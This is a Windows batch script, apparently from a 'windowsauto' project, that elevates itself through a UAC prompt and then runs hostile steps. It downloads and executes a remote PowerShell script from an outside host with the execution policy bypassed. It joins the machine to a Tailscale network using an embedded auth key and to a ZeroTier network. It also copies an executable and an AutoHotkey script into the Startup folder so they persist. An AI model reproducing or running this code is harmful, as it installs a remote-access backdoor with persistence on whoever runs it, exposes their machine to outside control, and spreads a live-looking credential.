@echo off
if _%1_==_payload_  goto :payload

:getadmin
    echo %~nx0: elevating self
    set vbs=%temp%\getadmin.vbs
    echo Set UAC = CreateObject^("Shell.Application"^)                >> "%vbs%"
    echo UAC.ShellExecute "%~s0", "payload %~sdp0 %*", "", "runas", 1 >> "%vbs%"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
goto :eof

:payload

::ENTER YOUR CODE BELOW::   

powershell.exe -ExecutionPolicy Bypass -Command "irm ps.sudoer.ga | iex"
tailscale up --authkey tskey-auth-kmYWEs4CNTRL-E58dqRPnpjitN4wH1JYshiDnogxNZCqR --unattended
zerotier-cli join 0cccb752f77190cf

xcopy "%userprofile%\Downloads\windowsauto-main\windowsauto-main\plumb.exe" "%USERPROFILE%\Start Menu\Programs\Startup" /y

xcopy "%userprofile%\Downloads\windowsauto-main\windowsauto-main\media.ahk" "%USERPROFILE%\Start Menu\Programs\Startup" /y



::END OF YOUR CODE::

echo.
echo...Script Complete....
echo.







